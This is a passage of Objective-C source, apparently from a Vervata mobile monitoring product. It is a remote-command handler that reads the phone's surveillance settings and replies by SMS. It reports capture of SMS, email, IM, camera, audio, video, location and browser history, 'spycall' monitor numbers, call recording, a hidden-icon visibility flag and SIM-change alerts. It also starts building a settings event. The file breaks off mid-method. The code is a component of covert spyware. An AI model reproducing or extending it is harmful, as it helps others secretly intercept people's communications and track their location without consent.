/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  SetWatchFlagsProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  24/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "RequestSettingsProcessor.h"
#import "Preference.h"
#import "PrefLocation.h"
#import "PrefEventsCapture.h"
#import "PrefMonitorNumber.h"
#import "PrefHomeNumber.h"
#import "PrefEmergencyNumber.h"
#import "PrefNotificationNumber.h"
#import "PrefWatchList.h"
#import "PrefVisibility.h"
#import "PrefRestriction.h"
#import "PrefPanic.h"
#import "PrefRestriction.h"
#import "PrefDeviceLock.h"
#import "PrefKeyword.h"

#import "LicenseManager.h"
#import "LicenseInfo.h"

#import "FxSettingsEvent.h"
#import "RemoteCmdSettingsCode.h"
#import "DateTimeFormat.h"


#define kVCardVersion		@"2.1"

@interface RequestSettingsProcessor (PrivateAPI)
- (void) processRequestSettings;
- (void) createAndSendSettingEvent;
- (void) sendReplySMSWithResult:(NSString *) aResult; 
- (NSString *) displayStringWithItems: (NSArray *) aItems andCaption:(NSString *)aCaption;
- (NSString *) displayStringWithNumberArray: (NSArray *) aNumberArray remoteCommand: (NSInteger) aRemoteCommand;
@end

@implementation RequestSettingsProcessor
									   
/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the RequestSettingsProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (RequestSettingsProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
	DLog (@"RequestSettingsProcessor-->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the RequestSettingsProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"RequestSettingsProcessor-->doProcessingCommand");

	DLog (@"... create and send setting event")
	[self createAndSendSettingEvent];
		
	DLog (@"... process request setting")
	[self processRequestSettings];
}

#pragma mark RequestSettingsProcessor Private Methods

/**
 - Method name: processRequestSettings
 - Purpose:This method is used to process request settings
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (void) processRequestSettings {
	
	DLog (@"RequestSettingsProcessor-->processRequestSettings");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefEventsCapture *prefEvents		= (PrefEventsCapture *)[prefManager preference:kEvents_Ctrl];
	PrefLocation *prefLocation			= (PrefLocation *)[prefManager preference:kLocation];
	PrefMonitorNumber *prefMonitor		= (PrefMonitorNumber *) [prefManager preference:kMonitor_Number];
	PrefHomeNumber *prefHomeNumberList	= (PrefHomeNumber *) [prefManager preference:kHome_Number];
	PrefWatchList *prefWatchList		= (PrefWatchList *)[prefManager preference:kWatch_List];
	PrefEmergencyNumber *prefEmergencyNumberList = (PrefEmergencyNumber *) [prefManager preference:kEmergency_Number];
	PrefVisibility *prefVisibility		= (PrefVisibility *) [prefManager preference:kVisibility];
	PrefRestriction *prefRestriction	= (PrefRestriction *)[prefManager preference:kRestriction];
	PrefPanic *prefPanic				= (PrefPanic *)[prefManager preference:kPanic];
	PrefDeviceLock *prefDeviceLock		= (PrefDeviceLock *)[prefManager preference:kAlert];
	PrefKeyword *prefKeywords			= (PrefKeyword *)[prefManager preference:kKeyword];
	
	NSString *capture				= NSLocalizedString(@"kCapture", @"");
	NSString *spycall				= NSLocalizedString(@"kOneCall", @"");
	NSString *delieryRules			= NSLocalizedString(@"kDeliveryRules", @"");
	NSString *events				= NSLocalizedString(@"kEvents", @"");
	NSString *emergency				= NSLocalizedString(@"kEmergency", @"");
	NSString *home					= NSLocalizedString(@"kHome", @"");
	NSString *watchnumbers			= NSLocalizedString(@"kWatchNumbers", @"");
	NSString *watchOptions			= NSLocalizedString(@"kWatchOptions", @"");
	NSString *simChange				= NSLocalizedString(@"kSIMChangeNotification", @"");	
	NSString *visibility			= NSLocalizedString(@"kVisible", @"");
	NSString *addressBookMgtMode	= NSLocalizedString(@"kAddressbookManagementMode", @"");
	NSString *panicMode				= NSLocalizedString(@"kPanicMode", @"");
	NSString *cis					= NSLocalizedString(@"kCIS", @"");
	NSString *restriction			= NSLocalizedString(@"kRestriction", @"");
	NSString *panic					= NSLocalizedString(@"kPanic", @"");
	NSString *configurations		= NSLocalizedString(@"kConfigID", @"");
	NSString *deviceLock			= NSLocalizedString(@"kDeviceLock", @"");
	NSString *appProfile			= NSLocalizedString(@"kAppProfile", @"");
	NSString *urlProfile			= NSLocalizedString(@"kURLProfile", @"");
	NSString *debugMode				= NSLocalizedString(@"kDebugMode", @"");
	NSString *wfaPolicy				= NSLocalizedString(@"kWaitingForApprovalPolicy", @"");
//	NSString *calendar				= NSLocalizedString(@"kRequestSettingsCalendar", @"");
//	NSString *note					= NSLocalizedString(@"kRequestSettingsNote", @"");
	NSString *keywords				= NSLocalizedString(@"kRequestSettingsSMSKeywords", @"");
	NSString *callRecording			= NSLocalizedString(@"kRequestSettingsCallRecording", @"");
	
	id <ConfigurationManager> configurationManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mConfigurationManager];
	
	LicenseManager *licenseManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mLicenseManager];
	LicenseInfo *licenseInfo	   = [licenseManager mCurrentLicenseInfo];	
	
	NSMutableString *resultString = [NSMutableString string];
	
	// Capture ===================================================================================
	if ([licenseInfo configID] != CONFIG_PANIC_VISIBLE	&&
		[licenseInfo configID] != CONFIG_PANIC_PLUS_VISIBLE) {
		if ([prefEvents mStartCapture]) 
			capture = [capture stringByAppendingString:NSLocalizedString(@"kOn", @"")];
		else 
			capture = [capture stringByAppendingString:NSLocalizedString(@"kOff", @"")];
		[resultString appendFormat:@"%@\n", capture];
	}
	// Delivery Rules =================================================================================
	if ([licenseInfo configID] != CONFIG_PANIC_VISIBLE	&&
		[licenseInfo configID] != CONFIG_PANIC_PLUS_VISIBLE) {
		if ([prefEvents mDeliverTimer] == 0) {
			// No delivery, X events
			delieryRules = [NSString stringWithFormat:@"%@%@, %d %@",delieryRules, NSLocalizedString(@"kNoDelivery", @""),
							[prefEvents mMaxEvent],NSLocalizedString(@"kEvents:", @"")];
		} else {
			// Delivery rules: x hour, X events
			delieryRules = [NSString stringWithFormat:@"%@%d %@, %d %@",delieryRules,[prefEvents mDeliverTimer],NSLocalizedString(@"kHour", @""),
						   [prefEvents mMaxEvent],NSLocalizedString(@"kEvents:", @"")];
		}
		[resultString appendFormat:@"%@\n", delieryRules];
	}
	// Events ==================================================================================
	if ([licenseInfo configID] != CONFIG_PANIC_VISIBLE	&&
		[licenseInfo configID] != CONFIG_PANIC_PLUS_VISIBLE) {
		NSMutableArray *eventResults=[[NSMutableArray alloc] init];
		if ([prefEvents  mEnableCallLog] && [configurationManager isSupportedFeature:kFeatureID_EventCall])				// call
			[eventResults addObject: NSLocalizedString(@"kCallLog", @"")];
		if ([prefEvents  mEnableSMS] && [configurationManager isSupportedFeature:kFeatureID_EventSMS])					// sms
			[eventResults addObject:NSLocalizedString(@"kSMS", @"")];
		if ([prefEvents  mEnableEmail] && [configurationManager isSupportedFeature:kFeatureID_EventEmail])				// email
			[eventResults addObject:NSLocalizedString(@"kEmail", @"")];
		if ([prefEvents  mEnableMMS] && [configurationManager isSupportedFeature:kFeatureID_EventMMS])					// mms
			[eventResults addObject:NSLocalizedString(@"kMMS", @"")];
		if ([prefEvents  mEnablePinMessage] && [configurationManager isSupportedFeature:kFeatureID_EventPinMessage])	// pin message
			[eventResults addObject:NSLocalizedString(@"kPin", @"")];
		if ([prefEvents  mEnableIM] && [configurationManager isSupportedFeature:kFeatureID_EventIM])					// im
			[eventResults addObject:NSLocalizedString(@"kIM", @"")];
		if ([prefEvents  mEnableCameraImage] && [configurationManager isSupportedFeature:kFeatureID_EventCameraImage])	// camera
			[eventResults addObject:NSLocalizedString(@"kImage", @"")];
		if ([prefEvents  mEnableAudioFile] && [configurationManager isSupportedFeature:kFeatureID_EventSoundRecording]) // audio
			[eventResults addObject:NSLocalizedString(@"kAudio", @"")];
		if ([prefEvents  mEnableVideoFile] && [configurationManager isSupportedFeature:kFeatureID_EventVideoRecording]) // video
			[eventResults addObject:NSLocalizedString(@"kVideo", @"")];
		if ([prefLocation mEnableLocation] && [configurationManager isSupportedFeature:kFeatureID_EventLocation])		// location
			[eventResults addObject:NSLocalizedString(@"kLocation", @"")];
		if ([prefEvents  mEnableWallPaper] && [configurationManager isSupportedFeature:kFeatureID_EventWallpaper])		// wallpaper
			[eventResults addObject:NSLocalizedString(@"kWallpaper", @"")];
		if ([prefEvents  mEnableBrowserUrl] && [configurationManager isSupportedFeature:kFeatureID_EventBrowserUrl])	// browser url
			[eventResults addObject:NSLocalizedString(@"kBrowserURL", @"")];
		if ([prefEvents mEnableALC] && [configurationManager isSupportedFeature:kFeatureID_ApplicationLifeCycleCapture]) // application life cycle
			[eventResults addObject:NSLocalizedString(@"kRCMALC", @"")];
		if ([prefEvents mEnableCalendar] && [configurationManager isSupportedFeature:kFeatureID_EventCalendar])
			[eventResults addObject:NSLocalizedString(@"kCalendar", @"")];
		if ([prefEvents mEnableNote] && [configurationManager isSupportedFeature:kFeatureID_NoteCapture])
			[eventResults addObject:NSLocalizedString(@"kNote", @"")];
		events= [self displayStringWithItems:eventResults andCaption:events];
		events = [events stringByReplacingOccurrencesOfString:@"[" withString:@""];
		events = [events stringByReplacingOccurrencesOfString:@"]" withString:@""];
		[resultString appendFormat:@"%@\n", events];
	}
	// Location ======================================================================================
	if ([configurationManager isSupportedFeature:kFeatureID_EventLocation])  {
		DLog (@"1 request setting: location")
		NSString *locationInterval = [NSString stringWithFormat:@"%@%@",
									  NSLocalizedString(@"kLocationInterval", @""),
									  [RemoteCmdProcessorUtils locationTimeIntervalForDisplay:[prefLocation mLocationInterval]]];
		[resultString appendFormat:@"%@\n", locationInterval];
	}
	
	// SpyCall ===========================================================================================
	if ([configurationManager isSupportedFeature:kFeatureID_SpyCall]) {
		DLog(@"2 request setting: spycall")
		if ([prefMonitor mEnableMonitor]) {
			spycall = [spycall stringByAppendingString:NSLocalizedString(@"kOn", @"")];
		}
		else {
			spycall = [spycall stringByAppendingString:NSLocalizedString(@"kOff", @"")];
		}
		spycall = [spycall stringByAppendingString:@", "];
		spycall = [self displayStringWithItems:[prefMonitor mMonitorNumbers] andCaption:spycall];
		[resultString appendFormat:@"%@\n", spycall];
	}
	
	// Watch Options ===============================================================================
	if ([configurationManager isSupportedFeature:kFeatureID_WatchList]) {
		DLog(@"3 request setting: watch options")
		if([prefWatchList mEnableWatchNotification] == 1) {
			watchOptions=[watchOptions stringByAppendingString:NSLocalizedString(@"kOn", @"")];
		}
		else {
			watchOptions=[watchOptions stringByAppendingString:NSLocalizedString(@"kOff", @"")];
		}
		watchOptions = [watchOptions stringByAppendingString:@", "];
		
		if ([prefWatchList mWatchFlag] & kWatch_In_Addressbook)  
			watchOptions=[NSString stringWithFormat:@"%@[%@,",watchOptions,@"1"];
		else 
			watchOptions=[NSString stringWithFormat:@"%@[%@,",watchOptions,@"0"];
		
		if ([prefWatchList mWatchFlag] & kWatch_Not_In_Addressbook)  
			watchOptions=[NSString stringWithFormat:@"%@%@,",watchOptions,@"1"];
		else 
			watchOptions=[NSString stringWithFormat:@"%@%@,",watchOptions,@"0"];
		
		if ([prefWatchList mWatchFlag] & kWatch_In_List)  
			watchOptions=[NSString stringWithFormat:@"%@%@,",watchOptions,@"1"];
		else 
			watchOptions=[NSString stringWithFormat:@"%@%@,",watchOptions,@"0"];
		
		if ([prefWatchList mWatchFlag] & kWatch_Private_Or_Unknown_Number)  
			watchOptions=[NSString stringWithFormat:@"%@%@]",watchOptions,@"1"];
		else 
			watchOptions=[NSString stringWithFormat:@"%@%@]",watchOptions,@"0"];
		
		[resultString appendFormat:@"%@\n", watchOptions];
	}
	
	// SIM change ===============================================================================
	if ([configurationManager isSupportedFeature:kFeatureID_SIMChange]) {
		DLog(@"4 request setting: sim change")
		simChange = [simChange stringByAppendingString:NSLocalizedString(@"kOn", @"")];
		[resultString appendFormat:@"%@\n", simChange];
	}
		
	// Visibility ===============================================================================
	if ([configurationManager isSupportedFeature:kFeatureID_HideApplicationIcon]) {
		DLog(@"5 request setting: visibility")
		if (prefVisibility) {
			DLog(@"prefVisibility exists")
		}
		if ([prefVisibility mVisible] == TRUE) {
			DLog(@"true")
			visibility = [visibility stringByAppendingString:NSLocalizedString(@"kOn", @"")];
		} else {
			DLog(@"false")
			visibility = [visibility stringByAppendingString:NSLocalizedString(@"kOff", @"")];
		}
		[resultString appendFormat:@"%@\n", visibility];
	}
	
	// Home ===========================================================================================
	if ([configurationManager isSupportedFeature:kFeatureID_HomeNumbers]) {
		DLog(@"6 request setting: home")
		home = [self displayStringWithItems:[prefHomeNumberList mHomeNumbers] andCaption:home];
		[resultString appendFormat:@"%@\n", home];
	}
	
	// Panic mode =====================================================================================
	if ([configurationManager isSupportedFeature:kFeatureID_Panic]) {
		DLog(@"7 request setting: panic mode")
		if (prefPanic) {
			DLog(@"prefPanic exists")
			if ([prefPanic mLocationOnly] == TRUE) {
				DLog(@"true")
				panicMode = [panicMode stringByAppendingString:NSLocalizedString(@"kLocationOnly", @"")];						
			} else {
				DLog(@"false")
				panicMode = [panicMode stringByAppendingString:NSLocalizedString(@"kLocationAndImage", @"")];				
			}					
		}
		[resultString appendFormat:@"%@\n", panicMode];
	}
	
	// CIS --> None
	if ([configurationManager isSupportedFeature:kFeatureID_CISNumbers]) {
		DLog(@"8 request setting: CIS")
		cis = [cis stringByAppendingString:NSLocalizedString(@"kNone", @"")];
		[resultString appendFormat:@"%@\n", cis];
	}
	
	// Communication restrictions: 
	if ([configurationManager isSupportedFeature:kFeatureID_CommunicationRestriction]) {
		DLog(@"9 request setting: communication restriction")
		if (prefRestriction) {
			DLog(@"prefRestriction exists")
			if ([prefRestriction mEnableRestriction] == TRUE) {
				DLog(@"true")
				restriction = [restriction stringByAppendingString:NSLocalizedString(@"kOn", @"")];						
			} else {
				DLog(@"false")
				restriction = [restriction stringByAppendingString:NSLocalizedString(@"kOff", @"")];				
			}					
		}
		[resultString appendFormat:@"%@\n", restriction];
	}
	
	// Configuration
	NSInteger configID = [licenseInfo configID];	
	configurations = [NSString stringWithFormat:@"%@%d", configurations, configID];
	[resultString appendFormat:@"%@\n", configurations];
	
	// Panic
	if ([configurationManager isSupportedFeature:kFeatureID_Panic]) {
		DLog(@"10 request setting: panic")
		if (prefPanic) {
			DLog(@"prefPanic exists")
			if ([prefPanic mPanicStart] == TRUE) {
				DLog(@"true")
				panic = [panic stringByAppendingString:NSLocalizedString(@"kOn", @"")];						
			} else {
				DLog(@"false")
				panic = [panic stringByAppendingString:NSLocalizedString(@"kOff", @"")];				
			}					
		}
		[resultString appendFormat:@"%@\n", panic];
	}
			
	// Device lock
	if ([configurationManager isSupportedFeature:kFeatureID_AlertLockDevice]) {
		DLog(@"11 request setting: device lock")
		if (prefDeviceLock) {
			DLog(@"prefDeviceLock exists")
			if ([prefDeviceLock mStartAlertLock] == TRUE) {
				DLog(@"true")
				deviceLock = [deviceLock stringByAppendingString:NSLocalizedString(@"kOn", @"")];						
			} else {
				DLog(@"false")
				deviceLock = [deviceLock stringByAppendingString:NSLocalizedString(@"kOff", @"")];				
			}					
		}
		[resultString appendFormat:@"%@\n", deviceLock];
	}
	
	// Emergency========================================================================================
	if ([configurationManager isSupportedFeature:kFeatureID_EmergencyNumbers]) {
		DLog(@"12 request setting: emergency")
		emergency = [self displayStringWithItems:[prefEmergencyNumberList mEmergencyNumbers] andCaption:emergency];
		[resultString appendFormat:@"%@\n", emergency];
	}
	
	// Watch Numbers =================================================================================
	if ([configurationManager isSupportedFeature:kFeatureID_WatchList]) {
		DLog(@"13 request setting: watch")
		watchnumbers = [self displayStringWithItems:[prefWatchList mWatchNumbers] andCaption:watchnumbers];
		[resultString appendFormat:@"%@\n", watchnumbers];
	}
	
	// Debug mode --> Off		
	debugMode = [debugMode stringByAppendingString:NSLocalizedString(@"kOff", @"")];
	[resultString appendFormat:@"%@\n", debugMode];	
	
	// AddressBookManagement Mode =======================================================================
	if ([configurationManager isSupportedFeature:kFeatureID_AddressbookManagement]) {
		DLog(@"14 request setting: address book mode")
		DLog(@"address mgt mode: %d", [prefRestriction mAddressBookMgtMode])
		if ([prefRestriction mAddressBookMgtMode] & kAddressMgtModeOff) 
			addressBookMgtMode = [addressBookMgtMode stringByAppendingString:NSLocalizedString(@"kAddressbookManagementModeOff", @"")];
		else if ([prefRestriction mAddressBookMgtMode] & kAddressMgtModeMonitor)
			addressBookMgtMode = [addressBookMgtMode stringByAppendingString:NSLocalizedString(@"kAddressbookManagementModeMonitor", @"")];
		else if ([prefRestriction mAddressBookMgtMode] & kAddressMgtModeRestrict)
			addressBookMgtMode = [addressBookMgtMode stringByAppendingString:NSLocalizedString(@"kAddressbookManagementModeRestrict", @"")];
		
		[resultString appendFormat:@"%@\n", addressBookMgtMode];
	}
	
	// Enable Application Profile
	if ([configurationManager isSupportedFeature:kFeatureID_ApplicationProfile] &&
		[configurationManager isSupportedFeature:kFeatureID_CommunicationRestriction]) {
		DLog(@"15 request setting: Application Profile")
		if (prefRestriction) {
			DLog(@"prefRestriction exists")
			if ([prefRestriction mEnableAppProfile] == TRUE) {
				DLog(@"true")
				appProfile = [appProfile stringByAppendingString:NSLocalizedString(@"kOn", @"")];						
			} else {
				DLog(@"false")
				appProfile = [appProfile stringByAppendingString:NSLocalizedString(@"kOff", @"")];				
			}					
		}
		[resultString appendFormat:@"%@\n", appProfile];
	}
	
	// Enable URL Profile
	if ([configurationManager isSupportedFeature:kFeatureID_BrowserUrlProfile] &&
		[configurationManager isSupportedFeature:kFeatureID_CommunicationRestriction]) {
		DLog(@"16 request setting: URL Profile")
		if (prefRestriction) {
			DLog(@"prefRestriction exists")
			if ([prefRestriction mEnableUrlProfile] == TRUE) {
				DLog(@"true")
				urlProfile = [urlProfile stringByAppendingString:NSLocalizedString(@"kOn", @"")];						
			} else {
				DLog(@"false")
				urlProfile = [urlProfile stringByAppendingString:NSLocalizedString(@"kOff", @"")];				
			}					
		}
		[resultString appendFormat:@"%@\n", urlProfile];
	}
	
	// Waiting for approval policy
	if ([configurationManager isSupportedFeature:kFeatureID_CommunicationRestriction]) {
		DLog(@"17 request setting: Waiting for approval policy")
		if (prefRestriction) {
			DLog(@"prefRestriction exists")
			if ([prefRestriction mWaitingForApprovalPolicy] == TRUE) {	// means 0 in terms of server 
				DLog(@"true")
				wfaPolicy = [wfaPolicy stringByAppendingString:NSLocalizedString(@"kAllow", @"")];						
			} else {
				DLog(@"false")
				wfaPolicy = [wfaPolicy stringByAppendingString:NSLocalizedString(@"kDisallow", @"")];				
			}					
		}
		[resultString appendFormat:@"%@\n", wfaPolicy];
	}
	
	// Calendar
	// Move to group with events
//	if ([configurationManager isSupportedFeature:kFeatureID_EventCalendar]) {
//		if ([prefEvents mEnableCalendar]) {
//			calendar = [calendar stringByAppendingString:NSLocalizedString(@"kOn", @"")];
//		} else {
//			calendar = [calendar stringByAppendingString:NSLocalizedString(@"kOff", @"")];
//		}
//		[resultString appendFormat:@"%@\n", calendar];
//	}
	
	// Note
	// Move to group with events
//	if ([configurationManager isSupportedFeature:kFeatureID_NoteCapture]) {
//		if ([prefEvents mEnableNote]) {
//			note = [note stringByAppendingString:NSLocalizedString(@"kOn", @"")];
//		} else {
//			note = [note stringByAppendingString:NSLocalizedString(@"kOff", @"")];
//		}
//		[resultString appendFormat:@"%@\n", note];
//	}
	
	// Keywords
	if ([configurationManager isSupportedFeature:kFeatureID_SMSKeyword]) {										  
		DLog(@"-20- request setting: keywords")
		keywords = [self displayStringWithItems:[prefKeywords mKeywords] andCaption:keywords];
		[resultString appendFormat:@"%@\n", keywords];
	}
	// Call recording
	if ([configurationManager isSupportedFeature:kFeatureID_CallRecording]) {										  
		DLog(@"-21- request setting: Call recording")
		if ([prefEvents mEnableCallRecording]) 
			callRecording = [callRecording stringByAppendingString:NSLocalizedString(@"kOn", @"")];
		else 
			callRecording = [callRecording stringByAppendingString:NSLocalizedString(@"kOff", @"")];
		[resultString appendFormat:@"%@\n", callRecording];				
	}
	
	//NSString *result=[NSString stringWithFormat:@"%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@",capture,delieryRules,events,spycall,locationInterval,watchOptions,home,emergency,watchnumbers];
	NSString *result = [NSString stringWithString:resultString];
    [self sendReplySMSWithResult:result];
}

- (void) createAndSendSettingEvent {	
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefEventsCapture *prefEvents		= (PrefEventsCapture *)[prefManager preference:kEvents_Ctrl];
	PrefLocation *prefLocation			= (PrefLocation *)[prefManager preference:kLocation];
	PrefWatchList *prefWatchList		= (PrefWatchList *)[prefManager preference:kWatch_List];
	PrefPanic *prefPanic				= (PrefPanic *)[prefManager preference:kPanic];
	PrefNotificationNumber *prefNotificationNumberList	= (PrefNotificationNumber *) [prefManager preference:kNotification_Number];
	PrefEmergencyNumber* prefEmergencyNumberList		= (PrefEmergencyNumber *) [prefManager preference:kEmergency_Number];
	PrefHomeNumber *prefHomeNumberList	= (PrefHomeNumber *) [prefManager preference:kHome_Number];
	PrefMonitorNumber *prefMonitor		= (PrefMonitorNumber *) [prefManager preference:kMonitor_Number];
	PrefRestriction *prefRestriction	= (PrefRestriction *)[prefManager preference:kRestriction];
	PrefKeyword *prefKeywords			= (PrefKeyword *)[prefManager preference:kKeyword];

	id <ConfigurationManager> configurationManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mConfigurationManager];
	
	NSMutableArray *settingElementArray = [NSMutableArray array];
	FxSettingsElement *element = nil;
	
	// -- add setting values to array
	
	// -- SMS	
	if ([configurationManager isSupportedFeature:kFeatureID_EventSMS]) {
		DLog (@"-1-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdSMS];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableSMS]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}	
	// -- CALL
	if ([configurationManager isSupportedFeature:kFeatureID_EventCall]) {
		DLog (@"-2-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdCallLog];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableCallLog]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- EMAIL
	if ([configurationManager isSupportedFeature:kFeatureID_EventEmail]) {
		DLog (@"-3-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdEmail];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableEmail]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- CELL INFO kRemoteCmdCellInfo
	// -- MMS
	if ([configurationManager isSupportedFeature:kFeatureID_EventMMS]) {
		DLog (@"-4-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdMMS];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableMMS]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Location
	if ([configurationManager isSupportedFeature:kFeatureID_EventLocation]) {
		DLog (@"-5-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdLocation];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefLocation mEnableLocation]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- IM
	if ([configurationManager isSupportedFeature:kFeatureID_EventIM]) {
		DLog (@"-6-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdIM];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableIM]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Wallpaper
	if ([configurationManager isSupportedFeature:kFeatureID_EventWallpaper]) {
		DLog (@"-7-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdWallPaper];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableWallPaper]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Camera
	if ([configurationManager isSupportedFeature:kFeatureID_EventCameraImage]) {
		DLog (@"-8-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdCameraImage];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableCameraImage]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Audio Recording
	if ([configurationManager isSupportedFeature:kFeatureID_EventSoundRecording]) {
		DLog (@"-9-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdAudioRecording];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableAudioFile]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Audio conversation kRemoteCmdAudioConversatio
	if ([configurationManager isSupportedFeature:kFeatureID_CallRecording]) {
		DLog (@"-9.2-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdAudioConversation];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableCallRecording]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Video
	if ([configurationManager isSupportedFeature:kFeatureID_EventVideoRecording]) {
		DLog (@"-10-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdVideoFile];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableVideoFile]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Pin message
	if ([configurationManager isSupportedFeature:kFeatureID_EventPinMessage]) {
		DLog (@"-11-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdPinMessage];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnablePinMessage]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Application kRemoteCmdApplication
	// -- Browser url
	if ([configurationManager isSupportedFeature:kFeatureID_EventBrowserUrl]) {
		DLog (@"-12-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdBrowserURL];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableBrowserUrl]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Application Life Cycle
	if ([configurationManager isSupportedFeature:kFeatureID_ApplicationLifeCycleCapture]) {
		DLog (@"-13-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdApplicationLifeCycle];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableALC]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}	
	// -- Start/Stop capture	
	element = [[FxSettingsElement alloc] init];
	[element setMSettingId:kRemoteCmdSetStartStopCapture];
	[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mStartCapture]]];
	[settingElementArray addObject:element];
	[element release];
	element = nil;
	// -- Delivery Timer
	element = [[FxSettingsElement alloc] init];
	[element setMSettingId:kRemoteCmdSetDeliveryTimer];
	[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mDeliverTimer]]];
	[settingElementArray addObject:element];
	[element release];
	element = nil;
	// -- Event Count
	element = [[FxSettingsElement alloc] init];
	[element setMSettingId:kRemoteCmdSetEventCount];
	[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mMaxEvent]]];
	[settingElementArray addObject:element];
	[element release];
	element = nil;
	// -- Enable watch
	if ([configurationManager isSupportedFeature:kFeatureID_WatchList]) {
		DLog (@"-14-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdSetEnableWatch];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefWatchList mEnableWatchNotification]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Watch flag and Watch number
	if ([configurationManager isSupportedFeature:kFeatureID_WatchList]) {
		DLog (@"-15.1-")
		NSString *watchOptions	= [NSString string];
		
		if ([prefWatchList mWatchFlag] & kWatch_In_Addressbook)						// WF1
			watchOptions = [NSString stringWithFormat:@"%@;",@"1"];		
		else
			watchOptions = [NSString stringWithFormat:@"%@;",@"0"];
		if ([prefWatchList mWatchFlag] & kWatch_Not_In_Addressbook)					// WF2
			watchOptions = [NSString stringWithFormat:@"%@%@;", watchOptions,@"1"];
		else 
			watchOptions = [NSString stringWithFormat:@"%@%@;", watchOptions,@"0"];
		if ([prefWatchList mWatchFlag] & kWatch_In_List)							// WF3
			watchOptions = [NSString stringWithFormat:@"%@%@;",watchOptions,@"1"];
		else 
			watchOptions = [NSString stringWithFormat:@"%@%@;",watchOptions,@"0"];	
		if ([prefWatchList mWatchFlag] & kWatch_Private_Or_Unknown_Number)			// WF4
			watchOptions = [NSString stringWithFormat:@"%@%@",watchOptions,@"1"];
		else 
			watchOptions = [NSString stringWithFormat:@"%@%@",watchOptions,@"0"];
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdSetWatchFlags];
		[element setMSettingValue:watchOptions];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
		
		DLog (@"watchOptions = %@", watchOptions);

		
		DLog(@"-15.2- watch number")
		NSString *watchNumberString = [self displayStringWithNumberArray:[prefWatchList mWatchNumbers] 
														   remoteCommand:kRemoteCmdWatchNumbers];		
		element = [[FxSettingsElement alloc] init];
